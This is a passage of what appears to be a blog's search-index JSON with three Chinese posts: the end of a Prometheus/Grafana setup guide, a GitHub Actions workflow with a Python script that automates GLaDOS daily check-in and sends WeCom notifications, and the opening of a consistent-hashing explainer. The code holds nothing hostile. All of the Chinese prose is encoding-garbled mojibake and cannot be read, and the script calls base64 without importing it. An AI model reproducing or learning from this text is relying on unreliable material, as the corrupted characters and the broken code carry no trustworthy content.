['127.0.0.1:9104']\n```\n\n+ é‡å¯æœåŠ¡\n\n```\nsudo systemctl restart prometheus\n```\n\n\n\n+ æ·»åŠ æ¨¡æ¿ç¼–å· 7362\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220216144528572.jpg\" alt=\"image-20220216144528572\" style=\"zoom:50%;\" />\n\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.iuskye.com/2021/03/30/prom-s1.html\n+ https://www.iuskye.com/2021/04/07/prom-s2.html\n+ https://www.iuskye.com/2021/05/07/prom-s3.html\n+ https://www.jianshu.com/p/967cb76cd5ca","tags":["prometheus"],"categories":["è½¯ä»¶"]},{"title":"gladosæ¯æ—¥ç­¾åˆ°å¹¶å‘é€å¾®ä¿¡é€šçŸ¥","url":"%2Fp%2Fd6b582c3.html","content":"\né€šè¿‡Github Actionè‡ªåŠ¨å®šæ—¶è¿è¡Œ`checkin.py`è„šæœ¬ï¼Œæ¯æ—¥è¿›è¡ŒGLaDOSçš„ç­¾åˆ°ï¼Œå¹¶å‘é€é€šçŸ¥åˆ°è‡ªå·±çš„å¾®ä¿¡ä¸Šã€‚\n\n# 1. å‡†å¤‡å·¥ä½œ\n\n### 1.1 github action\n\n+ é€šè¿‡Github Actionè‡ªåŠ¨å®šæ—¶è¿è¡Œ`checkin.py`è„šæœ¬ã€‚\n\n+ ç™»å½•GLaDOSåè·å–cookiesã€‚ï¼ˆç®€å•è·å–æ–¹æ³•ï¼šæµè§ˆå™¨å¿«æ·é”®F12ï¼Œæ‰“å¼€è°ƒè¯•çª—å£ï¼Œç‚¹å‡»â€œnetworkâ€è·å–ï¼‰\n+ ç„¶åé€šè¿‡â€œServeré…±â€ï¼ˆhttp://sc.ftqq.com/3.version)ï¼Œè‡ªåŠ¨å‘é€šçŸ¥åˆ°å¾®ä¿¡ä¸Šã€‚\n\n+ å¯ä»¥å‘é€åˆ°è‡ªå·±çš„ä¼ä¸šå¾®ä¿¡\n\n<!-- more -->\n\n## 1.2 ä¼ä¸šå¾®ä¿¡\n\nWecomé…±æ˜¯é€šè¿‡ä¼ä¸šå¾®ä¿¡æ¨é€æ¶ˆæ¯åˆ°å¾®ä¿¡çš„æ¶ˆæ¯æ¨é€å‡½æ•°å’Œåœ¨çº¿æœåŠ¡æ–¹æ¡ˆï¼Œå¼€æºå…è´¹ï¼Œå¯è‡ªå·±æ­å»ºã€‚æ”¯æŒå¤šè¯­è¨€ã€‚\n\nä¼˜ç‚¹ï¼š\n\n1. ä¸€æ¬¡é…ç½®ï¼ŒæŒç»­ä½¿ç”¨\n2. é…ç½®å¥½ä»¥åï¼Œåªéœ€è¦å¾®ä¿¡å°±èƒ½æ”¶æ¶ˆæ¯ï¼Œä¸å†éœ€è¦å®‰è£…ä¼ä¸šå¾®ä¿¡å®¢æˆ·ç«¯\n3. æ¶ˆæ¯æ¥å£æ— éœ€è®¤è¯å³å¯ä½¿ç”¨ï¼Œä¸ªäººç”¨å¾®ä¿¡å°±å¯ä»¥æ³¨å†Œ\n\n##### 1.2.1 æ“ä½œæµç¨‹ \n\n+ ç”¨ç”µè„‘æ‰“å¼€[ä¼ä¸šå¾®ä¿¡å®˜ç½‘](https://work.weixin.qq.com/)ï¼Œæ³¨å†Œä¸€ä¸ªä¼ä¸š\n+ æ³¨å†ŒæˆåŠŸåï¼Œç‚¹ã€Œç®¡ç†ä¼ä¸šã€è¿›å…¥ç®¡ç†ç•Œé¢ï¼Œé€‰æ‹©ã€Œåº”ç”¨ç®¡ç†ã€ â†’ ã€Œè‡ªå»ºã€ â†’ ã€Œåˆ›å»ºåº”ç”¨ã€\n+ åˆ›å»ºå®Œæˆåè¿›å…¥åº”ç”¨è¯¦æƒ…é¡µï¼Œå¯ä»¥å¾—åˆ°åº”ç”¨ID( `agentid` )â‘ ï¼Œåº”ç”¨Secret( `secret` )â‘¡ã€‚æ³¨æ„ï¼š`secret`æ¨é€åˆ°æ‰‹æœºç«¯æ—¶ï¼Œåªèƒ½åœ¨`ä¼ä¸šå¾®ä¿¡å®¢æˆ·ç«¯`ä¸­æŸ¥çœ‹ã€‚\n+ è¿›å…¥ã€Œ[æˆ‘çš„ä¼ä¸š](https://work.weixin.qq.com/wework_admin/frame#profile)ã€é¡µé¢ï¼Œæ‹‰åˆ°æœ€ä¸‹è¾¹ï¼Œå¯ä»¥çœ‹åˆ°ä¼ä¸šIDâ‘¢ï¼Œå¤åˆ¶å¹¶å¡«åˆ°ä¸Šæ–¹ã€‚\n+ è¿›å…¥ã€Œæˆ‘çš„ä¼ä¸šã€ â†’ ã€Œ[å¾®ä¿¡æ’ä»¶](https://work.weixin.qq.com/wework_admin/frame#profile/wxPlugin)ã€ï¼Œæ‹‰åˆ°ä¸‹è¾¹æ‰«æäºŒç»´ç ï¼Œå…³æ³¨ä»¥åå³å¯æ”¶åˆ°æ¨é€çš„æ¶ˆæ¯ã€‚\n+ è¿›å…¥ã€Œæˆ‘çš„ä¼ä¸šã€ â†’ ã€Œ[å¾®ä¿¡æ’ä»¶](https://work.weixin.qq.com/wework_admin/frame#profile/wxPlugin)ã€ï¼Œæ‹‰åˆ°æœ€ä¸‹æ–¹ï¼Œå‹¾é€‰ â€œå…è®¸æˆå‘˜åœ¨å¾®ä¿¡æ’ä»¶ä¸­æ¥æ”¶å’Œå›å¤èŠå¤©æ¶ˆæ¯â€ \n+ åœ¨ä¼ä¸šå¾®ä¿¡å®¢æˆ·ç«¯ ã€Œæˆ‘ã€ â†’ ã€Œè®¾ç½®ã€ â†’ ã€Œæ–°æ¶ˆæ¯é€šçŸ¥ã€ä¸­å…³é—­ â€œä»…åœ¨ä¼ä¸šå¾®ä¿¡ä¸­æ¥å—æ¶ˆæ¯â€ é™åˆ¶æ¡ä»¶\n\n\n\n# 2. workflow\n\n### 2.1 checkin.yml\n\n```yml\nname: glados-checkin\n\non:\n  workflow_dispatch: \n  push:\n    branches: [ master ]\n  pull_request:\n    branches: [ master ]\n  schedule:\n    - cron:  0 10,16 * * * \n      # \n      # https://tool.lu/crontab/\n      # https://datetime360.com/cn/utc-cst-china-time/\n  #watch:\n  #    types: started   \n\njobs:\n  checkin:\n    runs-on: ubuntu-latest\n    #if: github.event.repository.owner.id == github.event.sender.id\n    # https://p3terx.com/archives/github-actions-manual-trigger.html\n    \n    steps:\n    - uses: actions/checkout@v2\n\n    - name: Install Python\n      run: |\n        sudo apt update && \\\n        sudo apt install python3\n      \n    - name: requirements\n      run: |\n        pip3 install -r requirements.txt\n       # if [ -f requirements.txt ]; then pip install -r requirements.txt; fi \n    - name: Checkin\n      run: |\n        python3 checkin.py \n      env: \n        WECHAT_SECRET: ${{ secrets.WECHAT_SECRET }}\n        SERVE: ${{ secrets.SERVE }}\n        SCKEY: ${{ secrets.SCKEY }}\n        COOKIE: ${{ secrets.COOKIE }}\n```\n\n\n\n### 2.2 checkin.py\n\n```python\nimport json,requests,json,os\n\n# serveré…±å¼€å…³ï¼Œå¡«offä¸å¼€å¯(é»˜è®¤)ï¼Œå¡«onåŒæ—¶å¼€å¯cookieå¤±æ•ˆé€šçŸ¥å’Œç­¾åˆ°æˆåŠŸé€šçŸ¥\nsever = os.environ[\"SERVE\"]\n# å¡«å†™serveré…±sckey,ä¸å¼€å¯serveré…±åˆ™ä¸ç”¨å¡«\nsckey = os.environ[\"SCKEY\"]\n# å¡«å…¥gladosè´¦å·å¯¹åº”cookie\ncookie = os.environ[\"COOKIE\"]\n# ä¼ä¸šå¾®ä¿¡çš„å¯†é’¥\nwsecret = os.environ[\"WECHAT_SECRET\"]\n\n\ndef send_to_wecom(text,wecom_cid,wecom_aid,wecom_secret,wecom_touid='@all'):\n    get_token_url = f\"https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid={wecom_cid}&corpsecret={wecom_secret}\"\n    response = requests.get(get_token_url).content\n    access_token = json.loads(response).get('access_token')\n    if access_token and len(access_token) > 0:\n        send_msg_url = f'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token={access_token}'\n        data = {\n            \"touser\":wecom_touid,\n            \"agentid\":wecom_aid,\n            \"msgtype\":\"text\",\n            \"text\":{\n                \"content\":text\n            },\n            \"duplicate_check_interval\":600\n        }\n        response = requests.post(send_msg_url,data=json.dumps(data)).content\n        return response\n    else:\n        return False\n\ndef send_to_wecom_image(base64_content,wecom_cid,wecom_aid,wecom_secret,wecom_touid='@all'):\n    get_token_url = f\"https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid={wecom_cid}&corpsecret={wecom_secret}\"\n    response = requests.get(get_token_url).content\n    access_token = json.loads(response).get('access_token')\n    if access_token and len(access_token) > 0:\n        upload_url = f'https://qyapi.weixin.qq.com/cgi-bin/media/upload?access_token={access_token}&type=image'\n        upload_response = requests.post(upload_url, files={\n            \"picture\": base64.b64decode(base64_content)\n        }).json()\n        if \"media_id\" in upload_response:\n            media_id = upload_response['media_id']\n        else:\n            return False\n\n        send_msg_url = f'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token={access_token}'\n        data = {\n            \"touser\":wecom_touid,\n            \"agentid\":wecom_aid,\n            \"msgtype\":\"image\",\n            \"image\":{\n                \"media_id\": media_id\n            },\n            \"duplicate_check_interval\":600\n        }\n        response = requests.post(send_msg_url,data=json.dumps(data)).content\n        return response\n    else:\n        return False\n\ndef send_to_wecom_markdown(text,wecom_cid,wecom_aid,wecom_secret,wecom_touid='@all'):\n    get_token_url = f\"https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid={wecom_cid}&corpsecret={wecom_secret}\"\n    response = requests.get(get_token_url).content\n    access_token = json.loads(response).get('access_token')\n    if access_token and len(access_token) > 0:\n        send_msg_url = f'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token={access_token}'\n        data = {\n            \"touser\":wecom_touid,\n            \"agentid\":wecom_aid,\n            \"msgtype\":\"markdown\",\n            \"markdown\":{\n                \"content\":text\n            },\n            \"duplicate_check_interval\":600\n        }\n        response = requests.post(send_msg_url,data=json.dumps(data)).content\n        return response\n    else:\n        return False\n\n\ndef start():\n    url= \"https://glados.rocks/api/user/checkin\"\n    url2= \"https://glados.rocks/api/user/status\"\n    url3= \"https://glados.rocks/api/user/traffic\"\n    referer = 'https://glados.rocks/console/checkin'\n    origin = \"https://glados.rocks\"\n    useragent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36\"\n    payload={\n        'token': 'glados_network'\n    }\n    checkin = requests.post(url,headers={'cookie': cookie ,'referer': referer,'origin':origin,'user-agent':useragent,'content-type':'application/json;charset=UTF-8'},data=json.dumps(payload))\n    state =  requests.get(url2,headers={'cookie': cookie ,'referer': referer,'origin':origin,'user-agent':useragent})\n    traffic =  requests.get(url3,headers={'cookie': cookie ,'referer': referer,'origin':origin,'user-agent':useragent})\n    today = traffic.json()['data']['today']\n    str = \"cookieè¿‡æœŸ\"\n    if 'message' in checkin.text:\n        mess = checkin.json()['message']\n        time = state.json()['data']['leftDays']\n        time = time.split('.')[0]\n        str = '[pro] %s , you have %s days left. use: %.3f G' % (mess, time,today/1024/1024/1024)\n        if sever == '1' or sever == 'on':\n            requests.get('https://sc.ftqq.com/' + sckey + '.send?text='+str)\n    else:\n        requests.get('https://sc.ftqq.com/' + sckey + '.send?text='+str)\n\t\t\n    ret = send_to_wecom(str, \"wwc216d22335b2bb48\", \"1000002\", wsecret) # æ¢æˆè‡ªå·±çš„ä¼ä¸šå¾®ä¿¡id\n    print(str, ret)\n\ndef main_handler(event, context):\n    return start()\n\nif __name__ == '__main__':\n    start()\n```\n\n\n\n### 2.3 è®¾ç½®ä»“åº“ç§æœ‰å˜é‡\n<img src=\"gladosæ¯æ—¥ç­¾åˆ°å¹¶å‘é€å¾®ä¿¡é€šçŸ¥/1.png\" alt=\"image-20220210222931325\" style=\"zoom:50%;\" />\n\n- COOKIEï¼ˆGladosçš„cookie, å¿…å¡«ï¼‰\n- SERVEï¼ˆserveré…±å¼€å…³ï¼Œé»˜è®¤æ˜¯offï¼Œå¡«onçš„è¯ï¼Œä¼šåŒæ—¶å¼€å¯cookieå¤±æ•ˆé€šçŸ¥å’Œç­¾åˆ°æˆåŠŸé€šçŸ¥ï¼‰\n- SCKEYï¼ˆå¡«å†™serveré…±sckeyï¼Œä¸å¼€å¯serveré…±åˆ™ä¸ç”¨å¡«ï¼‰\n- WECHAT_SECRETï¼ˆè‡ªå·±ä¼ä¸šå¾®ä¿¡çš„å¯†é’¥ï¼‰\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://github.com/unix2dos/glados-checkin-1\n\n+ https://github.com/easychen/wecomchan","tags":["glados"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°","url":"%2Fp%2F15117917.html","content":"\nå½“ç³»ç»Ÿå®¹é‡å¢å¤šæ—¶ï¼Œå°±ä¼šå°†æ•°æ®æ°´å¹³åˆ‡åˆ†åˆ°ä¸åŒçš„èŠ‚ç‚¹æ¥å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯å°†æ•°æ®åˆ†å¸ƒåˆ°äº†ä¸åŒçš„èŠ‚ç‚¹ã€‚\n\n# 1. hashç®—æ³•\n\nå“ˆå¸Œç®—æ³•æœ€ç®€å•çš„åšæ³•å°±æ˜¯è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œæ¯”å¦‚åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼ŒåŸºäº `hash(key) % 3` å…¬å¼å¯¹æ•°æ®è¿›è¡Œäº†æ˜ å°„ã€‚\n\nä½†æ˜¯æœ‰ä¸€ä¸ªå¾ˆè‡´å‘½çš„é—®é¢˜ï¼Œå¦‚æœèŠ‚ç‚¹æ•°é‡å‘ç”Ÿäº†å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯åœ¨å¯¹ç³»ç»Ÿåšæ‰©å®¹æˆ–è€…ç¼©å®¹æ—¶ï¼Œå¿…é¡»è¿ç§»æ”¹å˜äº†æ˜ å°„å…³ç³»çš„æ•°æ®ï¼Œå¦åˆ™ä¼šå‡ºç°æŸ¥è¯¢ä¸åˆ°æ•°æ®çš„é—®é¢˜ã€‚\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/ed14c96417e08b4f916e0cd23d12b7bd.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/392c54cfb9ec47f5191008aa1d27d6b5.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nå‡è®¾æ€»æ•°æ®æ¡æ•°ä¸º Mï¼Œå“ˆå¸Œç®—æ³•åœ¨é¢å¯¹èŠ‚ç‚¹æ•°é‡å˜åŒ–æ—¶ï¼Œæœ€åæƒ…å†µä¸‹æ‰€æœ‰æ•°æ®éƒ½éœ€è¦è¿ç§»ï¼Œæ‰€ä»¥å®ƒçš„æ•°æ®è¿ç§»è§„æ¨¡æ˜¯ O(M)ï¼Œè¿™æ ·æ•°æ®çš„è¿ç§»æˆæœ¬å¤ªé«˜äº†ã€‚\n\n<!-- more -->\n\n# 2. ä¸€è‡´æ€§hashç®—æ³•\n\nä¸€è‡´å“ˆå¸Œç®—æ³•ä¹Ÿç”¨äº†å–æ¨¡è¿ç®—ï¼Œä½†ä¸å“ˆå¸Œç®—æ³•ä¸åŒçš„æ˜¯ï¼Œå“ˆå¸Œç®—æ³•æ˜¯å¯¹èŠ‚ç‚¹çš„æ•°é‡è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œè€Œ**ä¸€è‡´å“ˆå¸Œç®—æ³•æ˜¯å¯¹ 2^32 è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼**ã€‚\n\næˆ‘ä»¬å¯ä»¥æŠŠä¸€è‡´å“ˆå¸Œç®—æ³•æ˜¯å¯¹ 2^32 è¿›è¡Œå–æ¨¡è¿ç®—çš„ç»“æœå€¼ç»„ç»‡æˆä¸€ä¸ªåœ†ç¯ï¼Œå°±åƒé’Ÿè¡¨ä¸€æ ·ï¼Œé’Ÿè¡¨çš„åœ†å¯ä»¥ç†è§£æˆç”± 60 ä¸ªç‚¹ç»„æˆçš„åœ†ï¼Œè€Œæ­¤å¤„æˆ‘ä»¬æŠŠè¿™ä¸ªåœ†æƒ³è±¡æˆç”± 2^32 ä¸ªç‚¹ç»„æˆçš„åœ†ï¼Œè¿™ä¸ªåœ†ç¯è¢«ç§°ä¸ºå“ˆå¸Œç¯ï¼Œå¦‚ä¸‹å›¾ï¼š\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/0ea3960fef48d4cbaeb4bec4345301e7.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nä¸€è‡´æ€§å“ˆå¸Œè¦è¿›è¡Œä¸¤æ­¥å“ˆå¸Œï¼š\n\n- ç¬¬ä¸€æ­¥ï¼šå¯¹å­˜å‚¨èŠ‚ç‚¹è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œä¹Ÿå°±æ˜¯å¯¹å­˜å‚¨èŠ‚ç‚¹åšå“ˆå¸Œæ˜ å°„ï¼Œæ¯”å¦‚æ ¹æ®èŠ‚ç‚¹çš„ IP åœ°å€è¿›è¡Œå“ˆå¸Œï¼›\n- ç¬¬äºŒæ­¥ï¼šå½“å¯¹æ•°æ®è¿›è¡Œå­˜å‚¨æˆ–è®¿é—®æ—¶ï¼Œå¯¹æ•°æ®è¿›è¡Œå“ˆå¸Œæ˜ å°„ï¼›\n\næ‰€ä»¥ï¼Œ**ä¸€è‡´æ€§å“ˆå¸Œæ˜¯æŒ‡å°†ã€Œå­˜å‚¨èŠ‚ç‚¹ã€å’Œã€Œæ•°æ®ã€éƒ½æ˜ å°„åˆ°ä¸€ä¸ªé¦–å°¾ç›¸è¿çš„å“ˆå¸Œç¯ä¸Š**ã€‚\n\né—®é¢˜æ¥äº†ï¼Œå¯¹ã€Œæ•°æ®ã€è¿›è¡Œå“ˆå¸Œæ˜ å°„å¾—åˆ°ä¸€ä¸ªç»“æœè¦æ€ä¹ˆæ‰¾åˆ°å­˜å‚¨è¯¥æ•°æ®çš„èŠ‚ç‚¹å‘¢ï¼Ÿ\n\nç­”æ¡ˆæ˜¯ï¼Œæ˜ å°„çš„ç»“æœå€¼å¾€é¡ºæ—¶é’ˆçš„æ–¹å‘çš„æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±æ˜¯å­˜å‚¨è¯¥æ•°æ®çš„èŠ‚ç‚¹ã€‚\n\n### 2.1 å¢åˆ èŠ‚ç‚¹\n\nä¸¾ä¸ªä¾‹å­ï¼Œæœ‰ 3 ä¸ªèŠ‚ç‚¹ç»è¿‡å“ˆå¸Œè®¡ç®—ï¼Œæ˜ å°„åˆ°äº†å¦‚ä¸‹å›¾çš„ä½ç½®ï¼š\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/83d7f363643353c92d252e34f1d4f687.png\" alt=\"img\" style=\"zoom:50%;\" />\n\næ¥ç€ï¼Œå¯¹è¦æŸ¥è¯¢çš„ key-01 è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œç¡®å®šæ­¤ key-01 æ˜ å°„åœ¨å“ˆå¸Œç¯çš„ä½ç½®ï¼Œç„¶åä»è¿™ä¸ªä½ç½®å¾€é¡ºæ—¶é’ˆçš„æ–¹å‘æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±æ˜¯å­˜å‚¨è¯¥ key-01 æ•°æ®çš„èŠ‚ç‚¹ã€‚\n\næ¯”å¦‚ï¼Œä¸‹å›¾ä¸­çš„ key-01 æ˜ å°„çš„ä½ç½®ï¼Œå¾€é¡ºæ—¶é’ˆçš„æ–¹å‘æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯èŠ‚ç‚¹ Aã€‚\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/30c2c70721c12f9c140358fbdc5f2282.png\" alt=\"img\" style=\"zoom:50%;\" />\n\næ‰€ä»¥ï¼Œå½“éœ€è¦å¯¹æŒ‡å®š key çš„å€¼è¿›è¡Œè¯»å†™çš„æ—¶å€™ï¼Œè¦é€šè¿‡ä¸‹é¢ 2 æ­¥è¿›è¡Œå¯»å€ï¼š\n\n+ é¦–å…ˆï¼Œå¯¹ key è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œç¡®å®šæ­¤ key åœ¨ç¯ä¸Šçš„ä½ç½®ï¼›\n\n+ ç„¶åï¼Œä»è¿™ä¸ªä½ç½®æ²¿ç€é¡ºæ—¶é’ˆæ–¹å‘èµ°ï¼Œé‡åˆ°çš„ç¬¬ä¸€èŠ‚ç‚¹å°±æ˜¯å­˜å‚¨ key çš„èŠ‚ç‚¹ã€‚\n\nçŸ¥é“äº†ä¸€è‡´å“ˆå¸Œå¯»å€çš„æ–¹å¼ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ï¼Œå¦‚æœå¢åŠ ä¸€ä¸ªèŠ‚ç‚¹æˆ–è€…å‡å°‘ä¸€ä¸ªèŠ‚ç‚¹ä¼šå‘ç”Ÿå¤§é‡çš„æ•°æ®è¿ç§»å—ï¼Ÿ\n\n\n\nå‡è®¾èŠ‚ç‚¹æ•°é‡ä» 3 å¢åŠ åˆ°äº† 4ï¼Œæ–°çš„èŠ‚ç‚¹ D ç»è¿‡å“ˆå¸Œè®¡ç®—åæ˜ å°„åˆ°äº†ä¸‹å›¾ä¸­çš„ä½ç½®ï¼š\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/f8909edef2f3949f8945bb99380baab3.png\" alt=\"img\" style=\"zoom:50%;\" />\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œkey-01ã€key-03 éƒ½ä¸å—å½±å“ï¼Œåªæœ‰ key-02 éœ€è¦è¢«è¿ç§»èŠ‚ç‚¹ Dã€‚\n\n\n\nå‡è®¾èŠ‚ç‚¹æ•°é‡ä» 3 å‡å°‘åˆ°äº† 2ï¼Œæ¯”å¦‚å°†èŠ‚ç‚¹ A ç§»é™¤ï¼š\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/31485046f1303b57d8aaeaab103ea7ab.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nä½ å¯ä»¥çœ‹åˆ°ï¼Œkey-02 å’Œ key-03 ä¸ä¼šå—åˆ°å½±å“ï¼Œåªæœ‰ key-01 éœ€è¦è¢«è¿ç§»èŠ‚ç‚¹ Bã€‚\n\nå› æ­¤ï¼Œ**åœ¨ä¸€è‡´å“ˆå¸Œç®—æ³•ä¸­ï¼Œå¦‚æœå¢åŠ æˆ–è€…ç§»é™¤ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»…å½±å“è¯¥èŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šé¡ºæ—¶é’ˆç›¸é‚»çš„åç»§èŠ‚ç‚¹ï¼Œå…¶å®ƒæ•°æ®ä¹Ÿä¸ä¼šå—åˆ°å½±å“**ã€‚\n\n\n\n### 2.2 å‡è¡¡æ€§\n\nä½†æ˜¯ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å¹¶ä¸ä¿è¯èŠ‚ç‚¹èƒ½å¤Ÿåœ¨å“ˆå¸Œç¯ä¸Šåˆ†å¸ƒå‡åŒ€ï¼Œè¿™æ ·å°±ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œä¼šæœ‰å¤§é‡çš„è¯·æ±‚é›†ä¸­åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸Šã€‚\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/d528bae6fcec2357ba2eb8f324ad9fd5.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nè¿™æ—¶å€™æœ‰ä¸€åŠä»¥ä¸Šçš„æ•°æ®çš„å¯»å€éƒ½ä¼šæ‰¾èŠ‚ç‚¹ Aï¼Œä¹Ÿå°±æ˜¯è®¿é—®è¯·æ±‚ä¸»è¦é›†ä¸­çš„èŠ‚ç‚¹ A ä¸Šï¼Œè¿™è‚¯å®šä¸è¡Œçš„å‘€ï¼Œè¯´å¥½çš„è´Ÿè½½å‡è¡¡å‘¢ï¼Œè¿™ç§æƒ…å†µä¸€ç‚¹éƒ½ä¸å‡è¡¡ã€‚\n\næ¯”å¦‚ï¼Œä¸Šå›¾ä¸­å¦‚æœèŠ‚ç‚¹ A è¢«ç§»é™¤äº†ï¼Œå½“èŠ‚ç‚¹ A å®•æœºåï¼Œæ ¹æ®ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•çš„è§„åˆ™ï¼Œå…¶ä¸Šæ•°æ®åº”è¯¥å…¨éƒ¨è¿ç§»åˆ°ç›¸é‚»çš„èŠ‚ç‚¹ B ä¸Šï¼Œè¿™æ ·ï¼ŒèŠ‚ç‚¹ B çš„æ•°æ®é‡ã€è®¿é—®é‡éƒ½ä¼šè¿…é€Ÿå¢åŠ å¾ˆå¤šå€ï¼Œä¸€æ—¦æ–°å¢çš„å‹åŠ›è¶…è¿‡äº†èŠ‚ç‚¹ B çš„å¤„ç†èƒ½åŠ›ä¸Šé™ï¼Œå°±ä¼šå¯¼è‡´èŠ‚ç‚¹ B å´©æºƒï¼Œè¿›è€Œå½¢æˆé›ªå´©å¼çš„è¿é”ååº”ã€‚\n\næ‰€ä»¥ï¼Œ**ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•è™½ç„¶å‡å°‘äº†æ•°æ®è¿ç§»é‡ï¼Œä½†æ˜¯å­˜åœ¨èŠ‚ç‚¹åˆ†å¸ƒä¸å‡åŒ€çš„é—®é¢˜**ã€‚\n\nä½†é—®é¢˜æ˜¯ï¼Œå®é™…ä¸­æˆ‘ä»¬æ²¡æœ‰é‚£ä¹ˆå¤šèŠ‚ç‚¹ã€‚æ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±åŠ å…¥**è™šæ‹ŸèŠ‚ç‚¹**ï¼Œä¹Ÿå°±æ˜¯å¯¹ä¸€ä¸ªçœŸå®èŠ‚ç‚¹åšå¤šä¸ªå‰¯æœ¬ã€‚\n\nå…·ä½“åšæ³•æ˜¯ï¼Œä¸å†å°†çœŸå®èŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œè€Œæ˜¯å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œå¹¶å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å®é™…èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ã€Œä¸¤å±‚ã€æ˜ å°„å…³ç³»ã€‚\n\næ¯”å¦‚å¯¹æ¯ä¸ªèŠ‚ç‚¹åˆ†åˆ«è®¾ç½® 3 ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼š\n\n- å¯¹èŠ‚ç‚¹ A åŠ ä¸Šç¼–å·æ¥ä½œä¸ºè™šæ‹ŸèŠ‚ç‚¹ï¼šA-01ã€A-02ã€A-03\n- å¯¹èŠ‚ç‚¹ B åŠ ä¸Šç¼–å·æ¥ä½œä¸ºè™šæ‹ŸèŠ‚ç‚¹ï¼šB-01ã€B-02ã€B-03\n- å¯¹èŠ‚ç‚¹ C åŠ ä¸Šç¼–å·æ¥ä½œä¸ºè™šæ‹ŸèŠ‚ç‚¹ï¼šC-01ã€C-02ã€C-03\n\nå¼•å…¥è™šæ‹ŸèŠ‚ç‚¹åï¼ŒåŸæœ¬å“ˆå¸Œç¯ä¸Šåªæœ‰ 3 ä¸ªèŠ‚ç‚¹çš„æƒ…å†µï¼Œå°±ä¼šå˜æˆæœ‰ 9 ä¸ªè™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œå“ˆå¸Œç¯ä¸Šçš„èŠ‚ç‚¹æ•°é‡å¤šäº† 3 å€ã€‚\n\n<img src=\"ä¸€è‡´æ€§hashç®—æ³•å’Œgolangå®ç°/dbb57b8d6071d011d05eeadd93269e13.png\" alt=\"img\" style=\"zoom: 50%;\" />\n\nä½ å¯ä»¥çœ‹åˆ°ï¼ŒèŠ‚ç‚¹æ•°é‡å¤šäº†åï¼ŒèŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šçš„åˆ†å¸ƒå°±ç›¸å¯¹å‡åŒ€äº†ã€‚è¿™æ—¶å€™ï¼Œå¦‚æœæœ‰è®¿é—®è¯·æ±‚å¯»å€åˆ°ã€ŒA-01ã€è¿™ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œæ¥ç€å†é€šè¿‡ã€ŒA-01ã€è™šæ‹ŸèŠ‚ç‚¹æ‰¾åˆ°çœŸå®èŠ‚ç‚¹ Aï¼Œè¿™æ ·è¯·æ±‚å°±èƒ½è®¿é—®åˆ°çœŸå®èŠ‚ç‚¹ A äº†ã€‚\n\nä¸Šé¢ä¸ºäº†æ–¹ä¾¿ä½ ç†è§£ï¼Œæ¯ä¸ªçœŸå®èŠ‚ç‚¹ä»…åŒ…å« 3 